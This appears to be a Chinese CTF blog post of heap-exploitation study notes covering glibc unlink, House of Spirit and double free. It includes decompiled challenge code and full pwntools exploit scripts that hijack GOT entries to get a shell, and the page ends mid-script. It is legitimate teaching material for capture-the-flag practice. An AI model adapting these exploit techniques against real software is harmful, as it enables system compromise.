@@ -1,0 +1,1358 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>heap_details | 风云阁</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="heap_details | 风云阁">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="MyGemspwntools gdb 调试脚本 attach_dbg_pie(io,brk_pts&#x3D;[],syms&#x3D;{},init_cmd&#x3D;[])  brk_pts （断点）和 syms （符号）的地址是低12位，可以在IDA中查看。 init_cmd ：gdb脚本，多行组成的列表。 from pwn import *  def attach_dbg_pie(io,brk_pts&#x3D;[],syms&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MyGems">
+<meta property="og:url" content="https://primelyw.github.io/2020/04/23/MyGems/index.html">
+<meta property="og:site_name" content="风云阁">
+<meta property="og:description" content="MyGemspwntools gdb 调试脚本 attach_dbg_pie(io,brk_pts&#x3D;[],syms&#x3D;{},init_cmd&#x3D;[])  brk_pts （断点）和 syms （符号）的地址是低12位，可以在IDA中查看。 init_cmd ：gdb脚本，多行组成的列表。 from pwn import *  def attach_dbg_pie(io,brk_pts&#x3D;[],syms&#x3D;">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/23/MyGems/image-20200423135125165.png">
+<meta property="og:image" content="https://primelyw.github.io/2020/04/23/MyGems/image-20200423135109179.png">
+<meta property="article:published_time" content="2020-04-23T05:41:24.548Z">
+<meta property="article:modified_time" content="2020-04-23T05:51:56.833Z">
+<meta property="article:author" content="枫云李">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="auto">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://primelyw.github.io/2020/04/23/MyGems/image-20200423135125165.png">
+
+
+<link rel="icon" href="/img/avatar2.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/github.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar2.jpg" />
+</a>
+<div class="author">
+    <span>枫云李</span>
+</div>
+
+<div class="icon">
+    
+</div>
+
+
+
+<a class="more-menus">更多菜单</a>
+
+
+<ul>
+    <li><div class="all active">全部文章</div></li>
+    
+        
+            <li><div data-rel="CTF">CTF</div></li>
+        
+    
+        
+            <li><div data-rel="Fuzz">Fuzz</div></li>
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/primelyw">github</a>
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="24">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://blog.plusls.com/">师父</a></li>
+            
+            <li><a target="_blank" href="https://blog.xhyh.best/">潇晗宇浩</a></li>
+            
+            <li><a target="_blank" href="http://pzhxbz.cn/">pzhxbz</a></li>
+            
+            <li><a target="_blank" href="https://evi0s.com/">evi0s</a></li>
+            
+            <li><a target="_blank" href="https://enivs0rt.github.io/">enivS0rt</a></li>
+            
+            <li><a target="_blank" href="http://sup3rgate.xyz/">SuperGate</a></li>
+            
+            <li><a target="_blank" href="https://ccdragon.cc/">ccdragon</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Pwn</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CVE</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">fuzz</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">afl</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">auto</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Defcon</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">ruby</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">lang</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class=""
+           href="/2020/04/23/MyGems/"
+           data-tag="Pwn,auto"
+           data-author="" >
+            <span class="post-title" title="MyGems">MyGems</span>
+            <span class="post-date" title="2020-04-23 13:41:24">2020/04/23</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/04/23/%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="虎符网安大赛2020">虎符网安大赛2020</span>
+            <span class="post-date" title="2020-04-23 12:50:42">2020/04/23</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/04/21/%E7%BA%A2%E5%AE%9D%E7%9F%B3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="ruby,lang"
+           data-author="" >
+            <span class="post-title" title="红宝石学习笔记">红宝石学习笔记</span>
+            <span class="post-date" title="2020-04-21 20:18:56">2020/04/21</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/04/15/2018%E7%BD%91%E9%BC%8E%E6%9D%AF/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="2018网鼎杯">2018网鼎杯</span>
+            <span class="post-date" title="2020-04-15 00:00:00">2020/04/15</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/04/14/Defcon2019Q/"
+           data-tag="Pwn,CTF,Defcon"
+           data-author="" >
+            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
+            <span class="post-date" title="2020-04-14 00:00:00">2020/04/14</span>
+        </a>
+        
+        <a  class="Fuzz "
+           href="/2020/04/10/AFL%E5%9F%BA%E7%A1%80/"
+           data-tag="fuzz,afl"
+           data-author="" >
+            <span class="post-title" title="AFL基础">AFL基础</span>
+            <span class="post-date" title="2020-04-10 12:35:49">2020/04/10</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/04/05/CVEs/"
+           data-tag="Pwn,CVE"
+           data-author="" >
+            <span class="post-title" title="CVEs">CVEs</span>
+            <span class="post-date" title="2020-04-05 20:45:40">2020/04/05</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/02/10/NullConCTF2020/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NullConCTF2020">NullConCTF2020</span>
+            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020/01/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2019/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="强网杯2019">强网杯2019</span>
+            <span class="post-date" title="2020-01-16 02:06:12">2020/01/16</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/11/30/N1CTF2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="N1CTF2019">N1CTF2019</span>
+            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="安洵杯2019">安洵杯2019</span>
+            <span class="post-date" title="2019-11-30 00:00:00">2019/11/30</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/11/07/Advance-rop/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Advance-rop">Advance-rop</span>
+            <span class="post-date" title="2019-11-07 09:50:48">2019/11/07</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/10/20/heap_details/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="heap_details">heap_details</span>
+            <span class="post-date" title="2019-10-20 00:00:00">2019/10/20</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/10/12/RoarCTF-2019/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="RoarCTF-2019">RoarCTF-2019</span>
+            <span class="post-date" title="2019-10-12 00:00:00">2019/10/12</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/22/Pwner/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="pwner">pwner</span>
+            <span class="post-date" title="2019-07-22 00:00:00">2019/07/22</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/18/tmux/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="tmux">tmux</span>
+            <span class="post-date" title="2019-07-18 00:00:00">2019/07/18</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/11/server_misc/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="server_misc">server_misc</span>
+            <span class="post-date" title="2019-07-11 00:00:00">2019/07/11</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/07/git_handbook/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="git handbook">git handbook</span>
+            <span class="post-date" title="2019-07-07 00:00:00">2019/07/07</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/26/assembly/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="assembly">assembly</span>
+            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/10/pwning/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="pwning">pwning</span>
+            <span class="post-date" title="2019-05-10 00:00:00">2019/05/10</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/01/finance/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="finance">finance</span>
+            <span class="post-date" title="2019-05-01 00:00:00">2019/05/01</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/04/30/elf_protector/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="elf_protector">elf_protector</span>
+            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/04/30/shellcode/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="shellcode">shellcode</span>
+            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019/04/29/StarCTF/"
+           data-tag="Pwn,CTF"
+           data-author="" >
+            <span class="post-title" title="StarCTF">StarCTF</span>
+            <span class="post-date" title="2019-04-29 00:00:00">2019/04/29</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-heap_details" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">heap_details</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-04-02 01:02:33'>2019-10-20 00:00</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#堆利用学习"><span class="toc-text">堆利用学习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unlink"><span class="toc-text">Unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2014-HITCON-stkof"><span class="toc-text">2014 HITCON stkof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-spirit"><span class="toc-text">House of spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#binary-：-oreo-ctf-wiki"><span class="toc-text">binary ： oreo (ctf-wiki) ;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-free"><span class="toc-text">Double free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#binary-noinfoleak-西湖论剑线上赛"><span class="toc-text">binary: noinfoleak (西湖论剑线上赛)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc-2-23-代码-Check"><span class="toc-text">glibc-2.23 代码 Check</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#malloc-c-源码分析"><span class="toc-text">malloc.c 源码分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#攻击Demo"><span class="toc-text">攻击Demo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#double-free"><span class="toc-text">double free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-force"><span class="toc-text">House of force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-spirit-1"><span class="toc-text">House of spirit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-lore"><span class="toc-text">House of lore</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="https://github.primelyw.io/images/image-20200116182337942.png" alt="image-20200116182337942"></p>
+<h1 id="堆利用学习"><a href="#堆利用学习" class="headerlink" title="堆利用学习"></a>堆利用学习</h1><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><pre><code class="c">//glibc 2.23 unlink define:
+#define unlink(AV, P, BK, FD)                                                                                              
+  {                                                                                                                         
+    FD = P-&gt;fd;                                                                                                             
+    BK = P-&gt;bk;                                                                                                             
+    if (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, 0))
+      malloc_printerr(check_action, &quot;corrupted double-linked list&quot;, P, AV);
+    else
+    { 
+      FD-&gt;bk = BK;
+      BK-&gt;fd = FD;  
+         ...
+        ....
+    }
+
+//glibc 2.27
+    #define unlink(AV, P, BK, FD)
+  {  
+    if (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), 0))
+      malloc_printerr(&quot;corrupted size vs. prev_size&quot;); 
+    FD = P-&gt;fd;                      
+    BK = P-&gt;bk;  
+    if (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, 0))
+      malloc_printerr(&quot;corrupted double-linked list&quot;);
+    else
+    {   
+      FD-&gt;bk = BK;
+      BK-&gt;fd = FD;  
+    }</code></pre>
+<p>Unlink利用原理是通过堆溢出写入的字节覆盖后一个chunk，修改了nextchunk-&gt;size的prev_in_use为0，free(small_chunk or large_chunk)的时候，就会unlik current chunk。控制P-&gt;fd 和 P-&gt;bk 为合适的字节，在合适的情况下可以达到任意地址读写 ，威力巨大。</p>
+<p>一种情况是：</p>
+<p>有一个chunk list，记录一下堆的指针。</p>
+<p>X 在 chunk_list 的地址区间中，*X = P。</p>
+<p>改P-&gt;fd = X-0x18; P-&gt;bk = X-0x10;</p>
+<p>执行unlink(P)时，FD = X-0x18; BK = X-0x10;</p>
+<p>FD-&gt;bk = BK. &lt;=&gt; *(X-0x18+0x18) = *(X)=  X-0x10;</p>
+<p>BK-&gt;fd = FD &lt;=&gt; *(x-0x10+0x10) = *(X) = X-0x18;</p>
+<p>这样在chunk_list中的X地址构造了伪heap chunk，通过程序的功能（比如edit or change 函数，堆题目一般有这些功能）。通过edite修改*(X)的内容后，chunk_list的内容也被修改，而且内容任意改写。再通过edit可以实现任意地址写入。后续就是leak @got，为所欲为。</p>
+<h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p>glibc为2.23</p>
+<p>逆向分析，满足上述利用条件。</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+bn = process(&#39;./stkof&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,False)
+puts_libc = libc.symbols[&#39;puts&#39;]
+
+context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+#gdb.attach(bn,&#39;b *0x0400B07&#39;)
+#context.log_level = &#39;debug&#39;
+
+def add(size):
+    bn.sendline(&#39;1&#39;);sleep(0.05)
+    bn.sendline(str(size));sleep(0.05)
+
+def delete(idx):
+    bn.sendline(&#39;3&#39;);sleep(0.05)
+    bn.sendline(str(idx));sleep(0.05)
+
+def edit(idx,content):
+    bn.sendline(&#39;2&#39;);sleep(0.05)
+    bn.sendline(str(idx));sleep(0.05)
+    bn.sendline(str(len(content)));sleep(0.05)
+    bn.send(content);sleep(0.05)
+
+def show(idx):
+    bn.sendline(&#39;4&#39;);sleep(0.05)
+    bn.sendline(str(idx));sleep(0.05)
+
+pool = 0x00602140+0x8*4 #4
+x = pool
+fd = x - 0x18
+bk = x-0x10
+print(hex(fd),hex(bk))
+
+for i in range(4):
+    add(0x30)
+
+add(0xf0)
+
+puts_got = 0x602020
+free_got = 0x602018
+puts_plt = 0x400760
+
+payload = p64(0)+p64(0)+p64(fd)+p64(bk)+&#39;a&#39;*0x10+p64(0x30)+&#39;\x00&#39;
+edit(4,payload)
+
+delete(5)
+payload = p64(free_got)+p64(puts_got)
+edit(4,payload)
+edit(1,p64(puts_plt))
+delete(2)
+for i in range(9):
+    bn.recvuntil(&#39;OK\n&#39;)
+real_puts = u64(bn.recvn(6)+&#39;\x00&#39;*2)
+print(hex(real_puts))
+base = real_puts-puts_libc
+one = base + 0xf1147
+edit(1,p64(one))
+delete(3)
+
+bn.interactive()
+</code></pre>
+<h2 id="House-of-spirit"><a href="#House-of-spirit" class="headerlink" title="House of spirit"></a>House of spirit</h2><h3 id="binary-：-oreo-ctf-wiki"><a href="#binary-：-oreo-ctf-wiki" class="headerlink" title="binary ： oreo (ctf-wiki) ;"></a>binary ： oreo (ctf-wiki) ;</h3><blockquote>
+<p>download link: <a href="https://github.com/primelyw/pwn" target="_blank" rel="noopener">https://github.com/primelyw/pwn</a></p>
+</blockquote>
+<p>运行ELF，初步观察：</p>
+<pre><code>Welcome to the OREO Original Rifle Ecommerce Online System!
+
+     ,______________________________________
+    |_________________,----------._ [____]  -,__  __....-----=====
+                   (_(||||||||||||)___________/                   |
+                      `----------&#39;   OREO [ ))&quot;-,                   |
+                                           &quot;&quot;    `,  _,--....___    |
+                                                   `/           &quot;&quot;&quot;&quot;
+
+What would you like to do?
+
+1. Add new rifle
+2. Show added rifles
+3. Order selected rifles
+4. Leave a Message with your Order
+5. Show current stats
+6. Exit!
+Action: </code></pre><p>Ida 分析：</p>
+<pre><code>.bss:0804A2A0 order_cnt       dd ?                    ; DATA XREF: func3+5A↑r
+.bss:0804A2A0                                         ; func3+62↑w ...
+.bss:0804A2A4 rifle_cnt       dd ?                    ; DATA XREF: func1+C5↑r
+.bss:0804A2A4                                         ; func1+CD↑w ...
+.bss:0804A2A8 ; char *dword_804A2A8
+.bss:0804A2A8 dword_804A2A8 </code></pre><p>0x804A2A0 订单数量</p>
+<p>0804A2A4 枪支数量</p>
+<p>0804A2A8  地址，留言地址。</p>
+<blockquote>
+<p>增加枪支数量的函数</p>
+</blockquote>
+<pre><code class="c">unsigned int func1()
+{
+  char *v1; // [esp+18h] [ebp-10h]
+  unsigned int v2; // [esp+1Ch] [ebp-Ch]
+
+  v2 = __readgsdword(0x14u);
+  v1 = rifle_chunk;
+  rifle_chunk = (char *)malloc(0x38u);
+  if ( rifle_chunk )
+  {
+    *((_DWORD *)rifle_chunk + 13) = v1;
+    printf(&quot;Rifle name: &quot;);
+    fgets(rifle_chunk + 25, 56, stdin);
+    pro_read(rifle_chunk + 25);
+    printf(&quot;Rifle description: &quot;);
+    fgets(rifle_chunk, 56, stdin);
+    pro_read(rifle_chunk);
+    ++rifle_cnt;
+  }
+  else
+  {
+    puts(&quot;Something terrible happened!&quot;);
+  }
+  return __readgsdword(0x14u) ^ v2;
+}</code></pre>
+<p>0x38大小的chunk。</p>
+<p>0~24 description</p>
+<p>25~51 name 存在溢出，可以修改 next_ptr</p>
+<p>52~56 next_ptr</p>
+<blockquote>
+<p>增加订单，清空枪支数量的函数</p>
+</blockquote>
+<pre><code>unsigned int func3()
+{
+  char *ptr; // ST18_4
+  char *v2; // [esp+14h] [ebp-14h]
+  unsigned int v3; // [esp+1Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  v2 = rifle_chunk;
+  if ( rifle_cnt )
+  {
+    while ( v2 )
+    {
+      ptr = v2;
+      v2 = (char *)*((_DWORD *)v2 + 13);
+      free(ptr);
+    }
+    rifle_chunk = 0;
+    ++order_cnt;
+    puts(&quot;Okay order submitted!&quot;);
+  }
+  else
+  {
+    puts(&quot;No rifles to be ordered!&quot;);
+  }
+  return __readgsdword(0x14u) ^ v3;
+</code></pre><p>链表删除枪支，无法 double_free</p>
+<blockquote>
+<p>显示枪支信息的函数</p>
+</blockquote>
+<pre><code>unsigned int func2()
+{
+  char *i; // [esp+14h] [ebp-14h]
+  unsigned int v2; // [esp+1Ch] [ebp-Ch]
+
+  v2 = __readgsdword(0x14u);
+  printf(&quot;Rifle to be ordered:\n%s\n&quot;, &quot;===================================&quot;);
+  for ( i = rifle_chunk; i; i = (char *)*((_DWORD *)i + 13) )
+  {
+    printf(&quot;Name: %s\n&quot;, i + 25);
+    printf(&quot;Description: %s\n&quot;, i);
+    puts(&quot;===================================&quot;);
+  }
+  return __readgsdword(0x14u) ^ v2;
+</code></pre><p>枪的数据结构 chunk 中的 next_ptr 可以被修改，通过该函数泄漏got地址。</p>
+<blockquote>
+<p>留言函数</p>
+</blockquote>
+<pre><code>unsigned int func4()
+{
+  unsigned int v0; // ST1C_4
+
+  v0 = __readgsdword(0x14u);
+  printf(&quot;Enter any notice you&#39;d like to submit with your order: &quot;);
+  fgets(dword_804A2A8, 128, stdin);
+  pro_read(dword_804A2A8);
+  return __readgsdword(0x14u) ^ v0;
+}</code></pre><blockquote>
+<p>利用思路：</p>
+<ol>
+<li>通过输入溢出修改枪的结构 next_ptr 为got的地址。计算出system地址</li>
+<li>House of spirit 。通过func2将它free掉。目标在得到写入0x804A2A8的权限</li>
+<li>0x804A2A8改写为got地址。通过func4改写got</li>
+</ol>
+</blockquote>
+<p>利用脚本如下：</p>
+<pre><code class="python">#coding=utf8
+
+from pwn import * 
+p = process(&#39;./oreo&#39;)
+
+elf = ELF(&#39;./oreo&#39;)
+printf_got = elf.got[&#39;printf&#39;]
+libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+strlen_got = elf.got[&#39;strlen&#39;]
+printf_base = libc.symbols[&#39;printf&#39;]
+sys_base = 0x3ada0
+
+
+def add(name,note):
+    #p.recvuntil(&#39;Action:&#39;)
+    sleep(0.001);p.sendline(&#39;1&#39;);
+    #p.recvuntil(&#39;Rifle name: &#39;)
+    p.sendline(name);sleep(0.001)
+    #p.recvuntil(&#39;Rifle description: &#39;)
+    p.sendline(note);sleep(0.001)
+def show():
+    p.sendline(&#39;2&#39;);sleep(0.001)
+
+def order():
+    p.sendline(&#39;3&#39;);sleep(0.001)
+
+def leave_note(note):
+    p.sendline(&#39;4&#39;);sleep(0.001)
+    p.sendline(note);sleep(0.001)
+
+
+add(&#39;a&#39;*27+p32(printf_got),&#39;ha&#39;)
+show()
+p.recvuntil(&#39;Description: &#39;);p.recvuntil(&#39;Description: &#39;)
+printf_real = u32(p.recv(4))
+print printf_real
+
+for i  in range(0x3f):
+    add(&#39;a&#39;,&#39;a&#39;)
+
+add(&#39;a&#39;*27+p32(0x804A2A8),&#39;hahha&#39;)
+leave_note((0x20-4) * &#39;a&#39;+p32(0) + p32(0x40) + p32(0x100))
+order()
+add(&#39;ok&#39;,p32(strlen_got)+&#39;hahhaa&#39;)
+sys_real  = printf_real +sys_base - printf_base;
+leave_note(p32(sys_real)+&#39;;/bin/sh&#39;)
+p.interactive()
+</code></pre>
+<h2 id="Double-free"><a href="#Double-free" class="headerlink" title="Double free"></a>Double free</h2><h3 id="binary-noinfoleak-西湖论剑线上赛"><a href="#binary-noinfoleak-西湖论剑线上赛" class="headerlink" title="binary: noinfoleak (西湖论剑线上赛)"></a>binary: noinfoleak (西湖论剑线上赛)</h3><blockquote>
+<p>download link: <a href="https://github.com/primelyw/pwn" target="_blank" rel="noopener">https://github.com/primelyw/pwn</a></p>
+</blockquote>
+<p>测试fastbin 的大小脚本</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+int main(){
+  for(int size = 1; size&lt;=120; size++ ){
+    void *p = malloc(size);
+    printf(&quot;(%d,0x%llx)\n&quot;,size,*((long long *)p-1));
+  }
+  return 0;
+}</code></pre>
+<blockquote>
+<p>运行程序初步观察</p>
+</blockquote>
+<pre><code>root@prime:/ctf/work/pwn# ./noinfoleak 
+&gt;1
+&gt;3
+&gt;4
+&gt;5
+No Such Choice
+&gt;
+No Such Choice
+&gt;
+No Such Choice
+&gt;
+No Such Choice
+&gt;</code></pre><p>没有任何可利用的输出。</p>
+<blockquote>
+<p>ida分析</p>
+</blockquote>
+<blockquote>
+<p>函数 func1 ， 16个单元，每个单元为16Bytes，前8Bytes 为note的地址，后8Bytes为note大小。</p>
+</blockquote>
+<pre><code>void sub_40090A()
+{
+  signed int i; // [rsp+8h] [rbp-8h]
+  int v1; // [rsp+Ch] [rbp-4h]
+
+  for ( i = 0; i &lt;= 15; ++i )
+  {
+    if ( !qword_6010A0[2 * i] )
+    {
+      putchar(62);
+      v1 = readnum();
+      if ( v1 &gt; 0 &amp;&amp; v1 &lt;= 127 )
+      {
+        qword_6010A0[2 * i + 1] = (void *)v1;
+        qword_6010A0[2 * i] = malloc(v1 + 1);
+        putchar(62);
+        read(0, qword_6010A0[2 * i], v1);
+      }
+      return;
+    }
+  }
+}</code></pre><blockquote>
+<p>函数2 ，删除留言 free</p>
+</blockquote>
+<pre><code>void f2()
+{
+  int v0; // [rsp+Ch] [rbp-4h]
+
+  putchar(62);
+  v0 = readnum();
+  if ( v0 &gt;= 0 &amp;&amp; v0 &lt;= 15 )
+    free(qword_6010A0[2 * v0]);
+}</code></pre><blockquote>
+<p>函数3 ,修改留言。</p>
+</blockquote>
+<pre><code class="signed">{
+  signed int result; // eax
+  signed int v1; // [rsp+Ch] [rbp-4h]
+
+  putchar(62);
+  result = readnum();
+  v1 = result;
+  if ( result &gt;= 0 &amp;&amp; result &lt;= 15 )
+  {
+    putchar(62);
+    result = read(0, qword_6010A0[2 * v1], (size_t)qword_6010A0[2 * v1 + 1]);
+  }
+  return result;</code></pre>
+<blockquote>
+<p> 利用思路：</p>
+<ol>
+<li>Double Free 得到 0x6010A0 写权限。</li>
+<li>为所欲为，泄漏got，修改为system。</li>
+</ol>
+</blockquote>
+<p>利用脚本如下:</p>
+<pre><code class="python">from pwn import *
+p = process(&#39;./noinfoleak&#39;)
+elf = ELF(&#39;./noinfoleak&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+free_got = elf.got[&#39;free&#39;]
+read_got  = elf.got[&#39;read&#39;]
+puts_plt = elf.symbols[&#39;puts&#39;]
+read_base = libc.symbols[&#39;read&#39;]
+sys_base = libc.symbols[&#39;system&#39;]
+
+fake_chunk = 0x601085-8
+target = 0x6010a0
+
+def add(sz,cont):
+    p.sendafter(&#39;&gt;&#39;,&#39;1&#39;)
+    p.sendafter(&#39;&gt;&#39;,str(sz))
+    p.sendafter(&#39;&gt;&#39;,cont)
+
+def delete(idx):
+    p.sendafter(&#39;&gt;&#39;,&#39;2&#39;)
+    p.sendafter(&#39;&gt;&#39;,str(idx))
+
+def edit(idx,cont):
+    p.sendafter(&#39;&gt;&#39;,&#39;3&#39;)
+    p.sendafter(&#39;&gt;&#39;,str(idx))
+    p.sendafter(&#39;&gt;&#39;,cont)
+
+add(100,&#39;1&#39;) #0
+add(100,&#39;2&#39;) #1
